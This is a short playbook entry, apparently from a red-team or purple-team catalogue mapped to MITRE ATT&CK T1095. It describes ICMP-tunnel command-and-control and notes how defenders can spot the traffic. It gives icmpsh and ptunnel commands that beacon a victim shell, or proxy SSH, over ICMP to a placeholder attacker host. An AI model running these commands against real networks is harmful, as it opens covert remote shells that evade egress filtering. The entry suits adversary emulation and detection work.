---
id: icmp-tunnel-c2
title: ICMP-tunnel C2 (echo-payload smuggling)
section: Command & Control
phase: Command & Control
attack:
  tactic: TA0011
  techniques: [T1095]
platform: [windows, network]
source: MITRE ATT&CK T1095; icmpsh / ptunnel ICMP tunneling
pair: icmp-c2-volume
---

Where TCP/UDP egress is filtered but the perimeter still answers pings, smuggle C2
inside the data field of ICMP echo request/reply — a non-application-layer channel
that many egress rules ignore entirely. Throughput is poor and it's noisy, but it
slips past L3/L4 ACLs. The tell is volumetric and structural: sustained echo traffic
with large, non-uniform payloads to one external host, far from the tiny fixed-size
pings the OS emits.

```sh
# icmpsh: attacker-side handler, victim beacons the shell over ICMP echo
icmpsh -t {{lhost}} -d 500   # (victim side; attacker runs the matching listener)
# ptunnel: proxy a TCP session inside ICMP to the attacker's proxy host
ptunnel -p {{lhost}} -lp {{port}} -da 127.0.0.1 -dp 22
```
